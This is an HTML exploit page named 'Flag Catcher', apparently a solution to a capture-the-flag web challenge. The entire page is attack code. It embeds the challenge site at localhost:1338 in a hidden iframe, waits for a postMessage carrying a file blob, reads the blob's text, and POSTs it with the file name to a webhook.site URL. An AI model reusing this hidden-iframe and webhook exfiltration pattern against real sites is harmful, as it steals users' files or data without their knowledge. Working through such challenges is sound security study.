<!DOCTYPE html>
<html>
<head>
  <title>Flag Catcher</title>
</head>
<body>
  <h1>Flag Catcher</h1>
  <script>
    console.log("[*] In exploit page");

    // Dynamically inject iframe pointing to the challenge page
    const iframe = document.createElement("iframe");
    iframe.src = "http://localhost:1338";
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    // Listen for flag postMessage
    window.addEventListener("message", async (event) => {
      console.log("[*] Got postMessage:", event.data);

      const file = event.data?.files?.[0];
      if (!file?.blob) return console.warn("No blob received");

      try {
        const text = await new Blob([file.blob]).text();
        console.log("[+] Extracted flag text:", text);

        await fetch("http://webhook.site/3479a7fe-2390-4039-a92c-9ee26bc2c2fb", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ flag: text, filename: file.name })
        });

        console.log("[+] Flag sent to webhook");
      } catch (e) {
        console.error("[!] Error parsing blob:", e);
      }
    });
  </script>
</body>
</html>
